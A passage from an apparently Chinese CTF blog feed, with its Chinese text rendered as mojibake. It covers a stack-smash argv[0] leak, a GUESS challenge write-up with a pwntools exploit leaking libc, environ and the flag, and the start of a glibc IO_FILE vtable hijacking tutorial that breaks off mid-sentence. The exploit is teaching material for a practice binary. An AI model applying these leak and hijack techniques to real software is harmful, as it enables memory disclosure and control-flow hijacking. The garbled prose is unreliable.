æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>__stack_chk_fail()</code>ä¼šè°ƒç”¨<code>__fortify_fail()</code>ï¼Œè€Œåè€…è¾“å‡ºäº†ä¸€è¡Œå­—ç¬¦ä¸²ï¼Œå®é™…ä¸Šæ˜¯ç”¨æ¥æç¤ºç”¨æˆ·è¯¥ç¨‹åºå‡ºé”™ï¼Œè€Œ__libc_argv[0]ä¸­å­˜çš„å°±æ˜¯ç¨‹åºåã€‚</p><p>â€‹        è€Œè¯¥å˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå­˜åœ¨mainå‡½æ•°çš„æ ˆå¸§ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ ˆä¸Šå¯ä»¥è¿›è¡Œè¶³å¤Ÿé•¿çš„è¾“å…¥ï¼Œå°±èƒ½è¦†ç›–canaryï¼Œå†å°†æƒ³è¦æ³„éœ²çš„target_addrè¦†ç›–argv[0]ï¼Œæ­¤æ—¶ç³»ç»Ÿç›‘æµ‹åˆ°æº¢å‡ºï¼Œæ‰§è¡Œ<code>__stack_chk_fail()</code>å’Œ<code>__fortify_fail()</code>å°±èƒ½è¾“å‡ºtarget_getçš„å†…å®¹ã€‚</p><p>â€‹        ç”¨è¿™æ ·çš„æ ˆæº¢å‡ºç†è®ºä¸Šå®ç°äº†ä»»æ„è¯»ï¼ˆæ»¡è¶³è¯»æƒé™ï¼‰ï¼Œä½†æ˜¯æ³„éœ²äº†ä¹‹åç³»ç»Ÿå°±å…³é—­è¿›ç¨‹ï¼Œæ— æ³•ç»§ç»­æ”»å‡»ã€‚</p><h2 id="0x01-Linux-çˆ¶å­è¿›ç¨‹"><a href="#0x01-Linux-çˆ¶å­è¿›ç¨‹" class="headerlink" title="0x01 . Linux çˆ¶å­è¿›ç¨‹"></a>0x01 . Linux çˆ¶å­è¿›ç¨‹</h2><p>â€‹        åœ¨linuxç¨‹åºä¸­ï¼Œä¸€èˆ¬ç”¨forkå‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ã€‚</p><p><img src="https://s1.ax1x.com/2020/07/14/UNPlHx.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPlHx.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        è¿™ä¸ªæ–°çš„å­è¿›ç¨‹ç†è®ºä¸Šç®—æ˜¯åŸè¿›ç¨‹çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œæ‰§è¡Œfork()æ—¶ï¼Œç³»ç»Ÿå…ˆä¸ºå­è¿›ç¨‹åˆ†é…èµ„æºï¼Œå†å°†åŸè¿›ç¨‹çš„ä¸€ç³»åˆ—æ•°æ®å’Œå˜é‡å¤åˆ¶åˆ°å­è¿›ç¨‹ä¸­ã€‚è¿™ä¸ªå¤åˆ¶çš„ç»“æœæ˜¯ï¼Œæ•°æ®å’Œå˜é‡çš„å€¼éƒ½ä¸€æ ·ï¼Œåœ¨ç³»ç»Ÿä¸­çš„è™šæ‹Ÿåœ°å€æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ç‰©ç†åœ°å€ä¸åŒï¼Œä¹Ÿå°±æ˜¯è¯´å°†æ•°æ®å¤åˆ¶åˆ°äº†å¦ä¸€ä¸ªç‰©ç†åœ°å€ï¼Œå³å‰¯æœ¬ã€‚</p><p>â€‹        è€Œæ–°è¿›ç¨‹åŸè¿›ç¨‹åœ¨fork()æ‰§è¡Œä¹‹åï¼Œè¿”å›å€¼ä¸ºå­è¿›ç¨‹çš„idã€‚é‚£ä¹ˆå¯¹äºv1å˜é‡ï¼ŒåŸè¿›ç¨‹çš„å€¼ä¸ºå­è¿›ç¨‹çš„idï¼Œå­è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œv1è‡ªç„¶ä¸º0ã€‚å¦‚æœè¿”å›å€¼ä¸º-1ï¼Œå³åˆ›å»ºè¿›ç¨‹å¤±è´¥ã€‚</p><p>â€‹        å½“fork()æ‰§è¡Œç»“æŸï¼Œçˆ¶å­è¿›ç¨‹çš„ä¸‹ä¸€è¡Œä»£ç éƒ½æ˜¯if(v1 == -1)ï¼Œéƒ½ä»è¿™é‡Œå¼€å§‹æ‰§è¡Œã€‚</p><h2 id="0x02-GUESS"><a href="#0x02-GUESS" class="headerlink" title="0x02 . GUESS"></a>0x02 . GUESS</h2><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>â€‹        ç”¨idaæ‰“å¼€æ–‡ä»¶å¯ä»¥çœ‹è§ï¼Œç¨‹åºä¸€å¼€å§‹å°±å°†flag.txtè¯»å–åˆ°äº†æ ˆä¸Š:</p><img src="https://s1.ax1x.com/2020/07/14/UNP3E6.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNP3E6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413155246955" style="zoom: 80%;" /><p>â€‹        ä¸è¿‡ç¨‹åºä¸­å­˜åœ¨canaryä¿æŠ¤ã€‚</p><img src="https://s1.ax1x.com/2020/07/14/UNPG4O.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPG4O.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413155332703" style="zoom:80%;" /><p>â€‹        è·‘ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯è®©ä½ è¾“å…¥flagã€‚è¾“å…¥AAAAAAAAã€‚</p><p>â€‹        gdbè°ƒè¯•çœ‹çœ‹æ ˆä¸Šçš„æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°flagçš„ç¡®åœ¨æ ˆä¸Šï¼ˆæ­¤å¤„ç”¨äº†æœ¬åœ°çš„flagï¼‰ã€‚</p><p><img src="https://s1.ax1x.com/2020/07/14/UNPm34.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPm34.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1"></p><p>â€‹        å¯ä»¥å¾—çŸ¥ä»¥ä¸‹éƒ¨åˆ†å˜é‡çš„åœ°å€ã€‚</p><table><thead><tr><th align="center">Variable</th><th align="center">Addr</th></tr></thead><tbody><tr><td align="center">argv[0]</td><td align="center">0x7fffffffdd88</td></tr><tr><td align="center">flag.txt</td><td align="center">0x7fffffffdc30</td></tr><tr><td align="center">User Input</td><td align="center">0x7fffffffdc60</td></tr></tbody></table><p>â€‹        å…¶ä¸­argv[0]ä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå­˜çš„æ˜¯ç¨‹åºè·¯å¾„åŠç¨‹åºåâ€œGUESSâ€ã€‚ä¹‹æ‰€ä»¥è¦æåˆ°argv[0]æ˜¯å› ä¸ºæ­¤å¤„å¯ä»¥ç”¨åˆ°æœ¬æ–‡ä¸Šè¿°çš„èŠ±å¼æ ˆæº¢å‡ºæŠ€å·§stack smashã€‚å› ä¸ºç¨‹åºä¸­çš„ç”¨æˆ·è¾“å…¥æ˜¯ç”¨gets()å®ç°çš„ï¼Œå› æ­¤ç”¨æˆ‘ä»¬å¯ä»¥ç”¨inputå°†è¶³å¤Ÿé•¿çš„paddingå’Œputsçš„gotè¡¨å€¼è¦†ç›–åˆ°argv[0]ï¼Œä»è€Œæ³„éœ²libcåŸºå€ã€‚(0xdd88 - 0xdc60 == 0x128)</p><p>â€‹        å¾—åˆ°äº†libcçš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³„éœ²å¦ä¸€ä¸ªå˜é‡environã€‚è¿™ä¸ªå˜é‡å­˜çš„æ˜¯ç¨‹åºçš„æ ˆåŸºå€ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®flag.txtåœ¨æ ˆä¸Šçš„å›ºå®šåç§»ï¼Œæ¥ç¡®å®šflagçš„å®é™…åœ°å€ã€‚environå˜é‡è¢«å­˜åœ¨ç¬¦å·è¡¨ä¸­ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šè¿°çš„stack smashæ³„éœ²gotè¡¨çš„æ–¹å¼å¾—åˆ°ã€‚</p><p>â€‹        gdbä¸‹æ–­ç‚¹å¾—åˆ°å½“å‰çš„æ ˆåœ°å€ã€‚</p><p><img src="https://s1.ax1x.com/2020/07/14/UNPeCF.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPeCF.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ - flag_aar == <span class="number">0x168</span></span><br><span class="line">environ - <span class="number">0x168</span> == flag_aar</span><br></pre></td></tr></table></figure><p>â€‹        ç°åœ¨åªè¦å†ä¸€æ¬¡è¿›è¡Œstack smashæ³„éœ²å‡ºæ ˆä¸Šçš„flagå³å¯ã€‚</p><h3 id="B-Exploit"><a href="#B-Exploit" class="headerlink" title="B . Exploit"></a>B . Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;B&#x27;</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">puts_gots = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_gots : &quot;</span> + <span class="built_in">hex</span>(puts_gots)</span><br><span class="line"></span><br><span class="line">libc_addr = puts_gots - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr : &quot;</span> + <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">stack_addr = libc_addr + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;B&#x27;</span> + p64(stack_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack_addr : &quot;</span> + <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;C&#x27;</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vtable-Hijack(the_end)</title>
      <link href="2020/04/09/Vtable-Hijack(the_end)/"/>
      <url>2020/04/09/Vtable-Hijack(the_end)/</url>
      
        <content type="html"><![CDATA[<p>â€‹        å…³äºIO FILE ä¸­çš„vtableåŠ«æŒã€‚<span id="more"></span>    </p><p>â€‹        å› ä¸ºåœ¨wctf2020ç¢°åˆ°äº†ä¸€ä¸ªè´¼ç®€å•(æ²¡åšå‡ºæ¥ğŸ™ƒ)çš„ioé‡å®šå‘é¢˜ç›®ï¼Œè€Œä¸”åˆ˜è€æ¿åˆ·how2heapçš„æ—¶å€™ä¹Ÿç¢°åˆ°äº†ä¸€äº›ioç›¸å…³çš„é¢˜ç›®ï¼Œæ‰€ä»¥æˆ‘æ„Ÿè§‰è¯¥ç¨å¾®äº†è§£äº†è§£pwnä¸­çš„ioã€‚</p><h2 id="0x00-IOå…¥é—¨-â€”â€”-åŸºæœ¬ç»“æ„ä½“"><a href="#0x00-IOå…¥é—¨-â€”â€”-åŸºæœ¬ç»“æ„ä½“" class="headerlink" title="0x00 . IOå…¥é—¨ â€”â€” åŸºæœ¬ç»“æ„ä½“"></a>0x00 . IOå…¥é—¨ â€”â€” åŸºæœ¬ç»“æ„ä½“</h2><p>â€‹        _IO_FILEæ˜¯æœ€åŸºæœ¬çš„ioæµç›¸å…³ç»“æ„ï¼Œé•¿è¿™æ ·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br></pre></td></tr></table></figure><p>â€‹        _IO_FILEä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆæˆå‘˜ä¸ºchainï¼Œå¯ä»¥å°†è¿›ç¨‹ä¸­æ‰€æœ‰çš„_IO_FILEç»“æ„ä¸²èµ·æ¥ï¼Œæ„æˆé“¾è¡¨ï¼Œé“¾è¡¨å¤´éƒ¨å­˜å‚¨åœ¨å…¨å±€å˜é‡_IO_list_allä¸­ã€‚å†æ¸…ç†ioæµçš„æ—¶å€™ä¼šéå†æ­¤é“¾è¡¨ã€‚</p><p>â€‹        è¿›ç¨‹ä¸€å¼€å§‹ï¼Œæœ¬æ¥å•¥ioæµéƒ½æ²¡æœ‰ï¼Œä½†æ˜¯æ²¡æœ‰ioå°±ä¸èƒ½å®ç°äº¤äº’ï¼Œæ‰€ä»¥æ‰€æœ‰è¿›ç¨‹éƒ½å­˜åœ¨ä¸‰ä¸ªè‡ªåŠ¨æ‰“å¼€çš„ioæµï¼šstdinï¼Œstdoutï¼Œstderrã€‚åˆ†åˆ«æ§åˆ¶ç¨‹åºçš„è¾“å…¥ï¼Œè¾“å‡ºå’ŒæŠ¥é”™ã€‚è¿™ä¸‰ä¸ªioæµéƒ½æ˜¯_IO_FILEç»“æ„ï¼Œåœ¨ç¬¦å·è¡¨ä¸­æ˜¯è¿™æ ·å­˜å‚¨çš„:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>â€‹        _IO_FILE_plusåœ¨_IO_FILEçš„åŸºç¡€ä¸Šï¼ŒåŠ ä¸Šä¸€ä¸ªæŒ‡å‘_IO_jump_t ç»“æ„ä½“ï¼Œå«vtableçš„æŒ‡é’ˆï¼Œåˆå°è£…æˆäº†ä¸€ä¸ªç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>â€‹        è€Œè¿™ä¸ªvtable(è™šè¡¨)æŒ‡å‘çš„ç»“æ„ä½“ï¼Œæ˜¯ä¸€å¼ å‡½æ•°è¡¨ï¼Œå­˜äº†è®¸å¤šä¸ioæ“ä½œç›¸å…³çš„å‡½æ•°ã€‚ioæ“ä½œä¼šé€šè¿‡äº¤å‰å¼•ç”¨é—´æ¥è®¿é—®åˆ°å‡½æ•°è¡¨ä¸­çš„ç›¸å…³å‡½æ•°ã€‚è¿™å¼ å‡½æ•°è¡¨é•¿è¿™æ ·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  **JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x01-Vtable-åŠ«æŒ"><a href="#0x01-Vtable-åŠ«æŒ" class="headerlink" title="0x01 . Vtable åŠ«æŒ"></a>0x01 . Vtable åŠ«æŒ</h2><p>â€‹        vtableï¼Œæˆ–è€…å«è™šè¡¨ã€‚IOçš„ç›¸å…³æ“ä½œä¸­ï¼ŒæŸäº›å‡½æ•°ä¼šè°ƒç”¨åˆ°è™šè¡¨ä¸­çš„å€¼ã€‚æ¯”å¦‚exit()ä¼šåœ¨ä¸€ç³»åˆ—çš„äº¤å‰å¼•ç”¨ä¸­è°ƒç”¨åˆ°å…¶è™šè¡¨ä¸­çš„setbuf()ï¼Œprintf()ä¼šç”¨åˆ°xput()ç­‰ç­‰ã€‚è¯¦ç»†çš„è°ƒç”¨åªèƒ½æŸ¥æŸ¥çœ‹ç›¸å…³å‡½æ•°çš„æºä»£ç äº†ã€‚ã€‚ã€‚ä»¥åå†è¯¦è¿°ã€‚ï¼ˆğŸ•ŠğŸ•ŠğŸ•Šï¼‰</p><p>â€‹        è™šè¡¨è¯´èµ·æ¥è·Ÿgotè¡¨pltè¡¨å·®ä¸å¤š(ä¸ªäººç†è§£)ï¼Œéƒ½å¯ä»¥é€šè¿‡åŠ«æŒè¡¨æ¥æ§åˆ¶ç¨‹åºæµç¨‹ã€‚ä½†ä¸åŒçš„æ˜¯ï¼Œgotè¡¨å¯å†™ï¼Œè™šè¡¨ä¸èƒ½ç›´æ¥æ”¹å†™ï¼Œè¿™ä¹Ÿå°±é™åˆ¶äº†æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹è™šè¡¨ä½¿å…¶æŒ‡å‘ç›®æ ‡å‡½æ•°ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªé€ è™šè¡¨è¾¾åˆ°åŒæ ·æ•ˆæœã€‚å¤§è‡´æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>è¦æ‰¾åˆ°è™šè¡¨ï¼Œå¾—å…ˆæ‰¾åˆ°å®ƒæ‰€åœ¨çš„ç»“æ„ä½“ï¼Œå³_IO_FILE_plusä½äºå“ªé‡Œã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼šå¦‚æœæ–‡ä»¶æµæ˜¯ä»¥fopen()çš„æ–¹å¼æ‰“å¼€çš„ï¼Œé‚£ä¹ˆæ–‡ä»¶æµä¼šå­˜åœ¨å †ä¸Šï¼›è€Œå¦‚æœæ˜¯stdinï¼Œstdoutï¼Œstderråˆ™æ˜¯å­˜åœ¨åº“æ–‡ä»¶ä¸­ã€‚æœ¬æ–‡ç« ä»…è€ƒè™‘åè€…çš„æƒ…å†µã€‚</li><li>é¦–å…ˆæˆ‘ä»¬è¦ç¡®å®šåº“æ–‡ä»¶çš„ç‰ˆæœ¬ï¼Œæ ¹æ®ä¸åŒç‰ˆæœ¬ç¡®å®švtableç›¸å¯¹äº_IO_FILE_pluså¼€å§‹åœ°å€çš„åç§»é‡ã€‚åœ¨libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8ã€‚</li><li>æ ¹æ®åç§»æˆ‘ä»¬å°±èƒ½æ±‚å‡ºè™šè¡¨çš„åœ°å€ï¼Œå°±èƒ½ä¼ªé€ è™šè¡¨åŠ«æŒç¨‹åºæµç¨‹äº†ã€‚libc2.23ç‰ˆæœ¬ä¸‹è™šè¡¨çš„ä¼ªé€ 